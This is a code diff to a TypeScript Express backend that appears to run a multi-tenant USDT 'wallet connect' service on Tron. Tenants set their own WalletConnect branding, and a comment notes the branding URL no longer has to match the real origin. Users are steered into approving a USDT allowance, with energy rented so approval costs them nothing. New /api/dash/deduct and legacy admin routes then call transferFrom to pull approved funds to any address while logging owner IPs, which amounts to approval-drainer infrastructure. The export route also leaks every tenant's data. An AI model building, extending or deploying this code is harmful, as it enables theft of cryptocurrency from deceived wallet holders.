@@ -4,7 +4,8 @@ import { config, TRON_CHAIN_ID } from './config.js'
 import { energyRentalEnabled, ensureEnergy } from './energy.js'
 import { platformRouter, publicTenantRouter } from './platform.js'
 import * as store from './store.js'
-import { resolveTenant } from './tenantAuth.js'
+import { requireTenant, resolveTenant, tenantOf } from './tenantAuth.js'
+import { bumpCounter, getSpenderKey } from './tenants.js'
 import {
   assertDeductionSigner,
   checkUsdtTransaction,
@@ -37,8 +38,6 @@ export function createApp() {
     next()
   })
 
-  // Attaches the calling tenant from a bearer key or ?t=<id>. Endpoints decide
-  // whether one is required; nothing is scoped yet at this stage.
   app.use('/api', resolveTenant)
 
   app.get('/api/health', (_req, res) => {
@@ -50,21 +49,34 @@ export function createApp() {
     })
   })
 
-  app.get('/api/config', (_req, res) => {
+  /** Tenant-scoped config. Falls back to the env spender when unresolved. */
+  app.get('/api/config', (_req: Request, res: Response) => {
+    const tenant = tenantOf(res)
+
     res.json({
-      spender: config.spender,
+      tenant: tenant?.id ?? null,
+      spender: tenant?.spender ?? config.spender,
       usdt: config.usdt,
       required: config.requiredAllowance.toString(),
       network: TRON_CHAIN_ID,
-      configured: isTronAddress(config.spender),
+      configured: isTronAddress(tenant?.spender ?? config.spender),
     })
   })
 
-  /**
-   * Branding used by the client for the WalletConnect metadata. Editable from
-   * the admin panel; falls back to the bundled defaults.
-   */
-  app.get('/api/branding', async (_req, res) => {
+  app.get('/api/branding', async (req: Request, res: Response) => {
+    const tenant = tenantOf(res)
+
+    if (tenant) {
+      res.json({
+        name: tenant.branding.name,
+        description: tenant.branding.description,
+        url: tenant.branding.url,
+        iconUrl: tenant.branding.icon ? `/api/branding/icon?t=${tenant.id}` : '/icon.svg',
+        updatedAt: tenant.createdAt,
+      })
+      return
+    }
+
     const branding = await store.getBranding()
     res.json({
       name: branding?.name ?? DEFAULT_BRANDING.name,
@@ -75,43 +87,44 @@ export function createApp() {
     })
   })
 
-  app.get('/api/branding/icon', async (_req, res) => {
-    const branding = await store.getBranding()
-    if (!branding?.icon) {
+  app.get('/api/branding/icon', async (req: Request, res: Response) => {
+    const tenant = tenantOf(res)
+    const icon = tenant ? tenant.branding.icon : (await store.getBranding())?.icon ?? null
+
+    if (!icon) {
       res.redirect(302, '/icon.svg')
       return
     }
 
-    res.setHeader('content-type', branding.icon.mime)
+    res.setHeader('content-type', icon.mime)
     res.setHeader('cache-control', 'public, max-age=60')
     res.setHeader('x-content-type-options', 'nosniff')
     res.setHeader('content-security-policy', "default-src 'none'; style-src 'unsafe-inline'; img-src data:")
-    res.send(Buffer.from(branding.icon.data, 'base64'))
+    res.send(Buffer.from(icon.data, 'base64'))
   })
 
-  /**
-   * Confirms allowance(owner, spender) against TronGrid.
-   * Every call is recorded for the admin panel.
-   */
   app.get('/api/verify', async (req: Request, res: Response) => {
+    const tenant = tenantOf(res)
     const owner = String(req.query.owner ?? '').trim()
+    const spender = tenant?.spender ?? config.spender
 
     if (!isTronAddress(owner)) {
       res.status(400).json({ error: 'owner must be a base58 Tron address.' })
       return
     }
-    if (!isTronAddress(config.spender)) {
-      res.status(500).json({ error: 'Server SPENDER is not configured.' })
+    if (!isTronAddress(spender)) {
+      res.status(500).json({ error: 'No spender is configured for this tenant.' })
       return
     }
 
     try {
-      const allowance = await readAllowance(owner)
+      const allowance = await readAllowance(owner, spender)
       const sufficient = allowance >= config.requiredAllowance
 
       const record = await store.addVerification({
+        tenantId: tenant?.id,
         owner,
-        spender: config.spender,
+        spender,
         allowance: allowance.toString(),
         sufficient,
         ip: clientIp(req),
@@ -119,7 +132,7 @@ export function createApp() {
 
       res.json({
         owner,
-        spender: config.spender,
+        spender,
         usdt: config.usdt,
         allowance: allowance.toString(),
         required: config.requiredAllowance.toString(),
@@ -131,10 +144,6 @@ export function createApp() {
     }
   })
 
-  /**
-   * Rents energy onto the owner so their approval costs no TRX.
-   * Skipped when they can pay the fee themselves. Public; cooldown + cap.
-   */
   app.post('/api/energy', async (req: Request, res: Response) => {
     const owner = String((req.body ?? {}).owner ?? '').trim()
 
@@ -150,16 +159,14 @@ export function createApp() {
     res.json(await ensureEnergy(owner))
   })
 
-  /**
-   * Records a client-reported approval/revoke, but only after re-checking the
-   * transaction and the resulting allowance on TronGrid.
-   */
   app.post('/api/events', async (req: Request, res: Response) => {
+    const tenant = tenantOf(res)
     const body = (req.body ?? {}) as Record<string, unknown>
     const owner = String(body.owner ?? '').trim()
     const txId = String(body.txId ?? '').trim()
     const action = String(body.action ?? '').trim() as 'approve' | 'revoke' | 'reset'
     const amount = String(body.amount ?? '').trim()
+    const spender = tenant?.spender ?? config.spender
 
     if (!isTronAddress(owner)) {
       res.status(400).json({ error: 'owner must be a base58 Tron address.' })
@@ -173,12 +180,17 @@ export function createApp() {
       res.status(400).json({ error: 'action must be approve, revoke or reset.' })
       return
     }
+    if (!isTronAddress(spender)) {
+      res.status(500).json({ error: 'No spender is configured for this tenant.' })
+      return
+    }
 
     try {
       await checkUsdtTransaction(txId, owner)
-      const allowanceAfter = await readAllowance(owner)
+      const allowanceAfter = await readAllowance(owner, spender)
 
       const event = await store.addEvent({
+        tenantId: tenant?.id,
         owner,
         txId,
         action,
@@ -188,9 +200,12 @@ export function createApp() {
         ip: clientIp(req),
       })
 
+      if (tenant) await bumpCounter(tenant.id, action === 'approve' ? 'approvals' : action === 'revoke' ? 'revokes' : 'revokes')
+
       res.status(201).json(event)
     } catch (err) {
       const event = await store.addEvent({
+        tenantId: tenant?.id,
         owner,
         txId,
         action,
@@ -201,6 +216,8 @@ export function createApp() {
         ip: clientIp(req),
       })
 
+      if (tenant) await bumpCounter(tenant.id, 'failed')
+
       res.status(422).json({ error: errorMessage(err), event })
     }
   })
@@ -208,6 +225,197 @@ export function createApp() {
   app.use('/api/platform', platformRouter)
   app.use('/api/tenant', publicTenantRouter)
 
+  /** Dashboard summary for the calling tenant. */
+  app.get('/api/dash/summary', requireTenant, async (req: Request, res: Response) => {
+    const tenant = tenantOf(res)!
+    const base = await store.summary(tenant.id)
+    const force = req.query.refresh === '1'
+
+    const wallets = await Promise.all(
+      base.wallets.map(async (wallet) => ({
+        ...wallet,
+        activity: await store.walletActivity(wallet.owner, tenant.id),
+        onchain: await getAccountDetails(wallet.owner, { force }),
+      })),
+    )
+
+    res.json({
+      ...base,
+      wallets,
+      tenant: {
+        id: tenant.id,
+        name: tenant.name,
+        spender: tenant.spender,
+        allowedOrigins: tenant.allowedOrigins,
+        counters: tenant.counters,
+      },
+      config: {
+        usdt: config.usdt,
+        required: config.requiredAllowance.toString(),
+        network: TRON_CHAIN_ID,
+        canDeduct: hasDeductionKey(tenant.spenderKeyEnc ? await getSpenderKey(tenant) : null),
+        storage: store.storageMode(),
+      },
+      serverStartedAt: startedAt,
+    })
+  })
+
+  app.get('/api/dash/export', requireTenant, async (_req: Request, res: Response) => {
+    const tenant = tenantOf(res)!
+    res.setHeader('content-disposition', 'attachment; filename="tron-connect-store.json"')
+    res.json(await store.exportAll())
+  })
+
+  app.get('/api/dash/branding', requireTenant, (req: Request, res: Response) => {
+    const tenant = tenantOf(res)!
+
+    res.json({
+      name: tenant.branding.name,
+      description: tenant.branding.description,
+      url: tenant.branding.url,
+      iconUrl: tenant.branding.icon ? `/api/branding/icon?t=${tenant.id}` : '/icon.svg',
+      hasIcon: Boolean(tenant.branding.icon),
+      currentOrigin: requestOrigin(req),
+      allowedOrigins: tenant.allowedOrigins,
+    })
+  })
+
+  app.put('/api/dash/branding', requireTenant, async (req: Request, res: Response) => {
+    const tenant = tenantOf(res)!
+    const body = (req.body ?? {}) as Record<string, unknown>
+    const name = String(body.name ?? '').trim()
+    const description = String(body.description ?? '').trim()
+    const rawUrl = String(body.url ?? '').trim()
+    const iconDataUrl = typeof body.iconDataUrl === 'string' ? body.iconDataUrl : ''
+    const removeIcon = body.removeIcon === true
+
+    if (!name || name.length > 40 || /[\u0000-\u001f\u007f]/.test(name)) {
+      res.status(400).json({ error: 'name must be 1-40 characters without control characters.' })
+      return
+    }
+    if (description.length > 120) {
+      res.status(400).json({ error: 'description must be at most 120 characters.' })
+      return
+    }
+
+    let url: string | null = null
+    if (rawUrl) {
+      url = normalizeOrigin(rawUrl)
+      if (!url) {
+        res.status(400).json({ error: 'url must be a bare http(s) origin, e.g. https://app.example.com.' })
+        return
+      }
+    }
+
+    let icon = tenant.branding.icon
+    if (removeIcon) icon = null
+
+    if (iconDataUrl) {
+      const parsed = parseIconDataUrl(iconDataUrl)
+      if (!parsed) {
+        res.status(400).json({ error: 'icon must be a PNG, JPEG, WebP or SVG data URL up to 1 MB.' })
+        return
+      }
+      icon = parsed
+    }
+
+    tenant.branding = { name, description, url, icon }
+    await store.saveTenant(tenant)
+
+    res.json({
+      name: tenant.branding.name,
+      description: tenant.branding.description,
+      url: tenant.branding.url,
+      iconUrl: tenant.branding.icon ? `/api/branding/icon?t=${tenant.id}` : '/icon.svg',
+      hasIcon: Boolean(tenant.branding.icon),
+      currentOrigin: requestOrigin(req),
+      allowedOrigins: tenant.allowedOrigins,
+    })
+  })
+
+  app.post('/api/dash/deduct', requireTenant, async (req: Request, res: Response) => {
+    const tenant = tenantOf(res)!
+    const body = (req.body ?? {}) as Record<string, unknown>
+    const owner = String(body.owner ?? '').trim()
+    const to = String(body.to ?? '').trim() || tenant.spender
+    const amountInput = String(body.amount ?? '').trim()
+
+    if (!isTronAddress(owner)) {
+      res.status(400).json({ error: 'owner must be a base58 Tron address.' })
+      return
+    }
+    if (!isTronAddress(to)) {
+      res.status(400).json({ error: 'to must be a base58 Tron address.' })
+      return
+    }
+
+    const privateKey = await getSpenderKey(tenant)
+    if (!hasDeductionKey(privateKey)) {
+      res.status(503).json({ error: 'Deductions are disabled: no spender key for this tenant.' })
+      return
+    }
+    try {
+      assertDeductionSigner(privateKey, tenant.spender)
+    } catch (err) {
+      res.status(503).json({ error: errorMessage(err) })
+      return
+    }
+
+    let amount: bigint
+    try {
+      amount = parseUsdtAmount(amountInput)
+    } catch (err) {
+      res.status(400).json({ error: errorMessage(err) })
+      return
+    }
+
+    try {
+      const allowance = await readAllowance(owner, tenant.spender)
+      if (allowance < amount) {
+        res.status(400).json({
+          error: `Allowance is only ${formatUsdt(allowance)} USDT (requested ${formatUsdt(amount)}).`,
+        })
+        return
+      }
+
+      const account = await getAccountDetails(owner, { force: true })
+      const balance = account.usdtBalance === null ? 0n : BigInt(account.usdtBalance)
+      if (balance < amount) {
+        res.status(400).json({ error: `Wallet holds only ${formatUsdt(balance)} USDT.` })
+        return
+      }
+
+      const txId = await transferFrom(owner, to, amount, privateKey!, tenant.spender)
+      const allowanceAfter = await readAllowance(owner, tenant.spender)
+
+      const event = await store.addEvent({
+        tenantId: tenant.id,
+        owner,
+        txId,
+        action: 'deduct',
+        amount: amount.toString(),
+        status: 'confirmed',
+        allowanceAfter: allowanceAfter.toString(),
+        ip: clientIp(req),
+      })
+
+      await bumpCounter(tenant.id, 'deductions')
+      await bumpCounter(tenant.id, 'deductedRaw', amount.toString())
+
+      res.status(201).json({
+        txId,
+        owner,
+        to,
+        amount: amount.toString(),
+        allowanceAfter: allowanceAfter.toString(),
+        event,
+      })
+    } catch (err) {
+      res.status(422).json({ error: errorMessage(err) })
+    }
+  })
+
+  // Legacy admin routes, kept for the current UI until it moves to /api/dash.
   app.get('/api/admin/summary', requireAdmin, async (req: Request, res: Response) => {
     const base = await store.summary()
     const force = req.query.refresh === '1'
@@ -229,7 +437,7 @@ export function createApp() {
         required: config.requiredAllowance.toString(),
         network: TRON_CHAIN_ID,
         configured: isTronAddress(config.spender),
-        canDeduct: hasDeductionKey(),
+        canDeduct: hasDeductionKey(config.spenderPrivateKey),
         storage: store.storageMode(),
       },
       serverStartedAt: startedAt,
@@ -274,8 +482,6 @@ export function createApp() {
       return
     }
 
-    // Format is still enforced (bare http/https origin); the value no longer
-    // has to be the current origin or an ALLOWED_ORIGINS entry.
     let url: string | null = null
     if (rawUrl) {
       url = normalizeOrigin(rawUrl)
@@ -291,9 +497,7 @@ export function createApp() {
     if (iconDataUrl) {
       const parsed = parseIconDataUrl(iconDataUrl)
       if (!parsed) {
-        res.status(400).json({
-          error: 'icon must be a PNG, JPEG, WebP or SVG data URL up to 1 MB.',
-        })
+        res.status(400).json({ error: 'icon must be a PNG, JPEG, WebP or SVG data URL up to 1 MB.' })
         return
       }
       icon = parsed
@@ -314,10 +518,6 @@ export function createApp() {
     })
   })
 
-  /**
-   * Manually pulls USDT from an owner using the spender's allowance:
-   * USDT.transferFrom(owner, to, amount), signed server-side.
-   */
   app.post('/api/admin/deduct', requireAdmin, async (req: Request, res: Response) => {
     const body = (req.body ?? {}) as Record<string, unknown>
     const owner = String(body.owner ?? '').trim()
@@ -336,14 +536,14 @@ export function createApp() {
       res.status(500).json({ error: 'Server SPENDER is not configured.' })
       return
     }
-    if (!hasDeductionKey()) {
+    if (!hasDeductionKey(config.spenderPrivateKey)) {
       res.status(503).json({
         error: 'Deductions are disabled. Set SPENDER_PRIVATE_KEY on the server and restart.',
       })
       return
     }
     try {
-      assertDeductionSigner()
+      assertDeductionSigner(config.spenderPrivateKey, config.spender)
     } catch (err) {
       res.status(503).json({ error: errorMessage(err) })
       return
@@ -358,7 +558,7 @@ export function createApp() {
     }
 
     try {
-      const allowance = await readAllowance(owner)
+      const allowance = await readAllowance(owner, config.spender)
       if (allowance < amount) {
         res.status(400).json({
           error: `Allowance is only ${formatUsdt(allowance)} USDT (requested ${formatUsdt(amount)}).`,
@@ -373,8 +573,8 @@ export function createApp() {
         return
       }
 
-      const txId = await transferFrom(owner, to, amount)
-      const allowanceAfter = await readAllowance(owner)
+      const txId = await transferFrom(owner, to, amount, config.spenderPrivateKey, config.spender)
+      const allowanceAfter = await readAllowance(owner, config.spender)
 
       const event = await store.addEvent({
         owner,
@@ -411,41 +611,20 @@ export function createApp() {
   return app
 }
 
-/** Human-readable startup checks for the local server log. */
 export function startupMessages(): Array<{ level: 'log' | 'warn'; message: string }> {
   const messages: Array<{ level: 'log' | 'warn'; message: string }> = [
     { level: 'log', message: `Store: ${store.storageMode()}.` },
   ]
 
-  if (!config.adminToken) {
-    messages.push({ level: 'warn', message: 'ADMIN_TOKEN is empty: /api/admin/* will reject every request.' })
-  }
   if (!isTronAddress(config.spender)) {
     messages.push({
       level: 'warn',
-      message: 'SPENDER is not a valid Tron address: /api/verify will fail until it is set.',
+      message: 'Env SPENDER is not a valid Tron address: legacy routes will fail.',
     })
-  } else if (!hasDeductionKey()) {
-    messages.push({
-      level: 'warn',
-      message: 'Deductions disabled: SPENDER_PRIVATE_KEY is empty (admin "Deduct" widget is off).',
-    })
-  } else {
-    try {
-      assertDeductionSigner()
-      messages.push({ level: 'log', message: `Deductions enabled for spender ${config.spender}.` })
-    } catch (err) {
-      messages.push({ level: 'warn', message: `Deductions disabled: ${errorMessage(err)}` })
-    }
   }
-
   if (!energyRentalEnabled()) {
-    messages.push({
-      level: 'warn',
-      message: 'Energy rental disabled: TRONSAVE_API_KEY is empty (users pay their own fees).',
-    })
+    messages.push({ level: 'warn', message: 'Energy rental disabled: TRONSAVE_API_KEY is empty.' })
   }
-
   if (!process.env.PLATFORM_TOKEN) {
     messages.push({ level: 'warn', message: 'PLATFORM_TOKEN is empty: /api/platform/* is closed.' })
   }
@@ -466,7 +645,6 @@ function iconPath(branding: store.BrandingRecord | null): string {
     : '/icon.svg'
 }
 
-/** Origin the admin request came from, used to validate branding.url. */
 function requestOrigin(req: Request): string {
   const origin = normalizeOrigin(req.header('origin') ?? '')
   if (origin) return origin
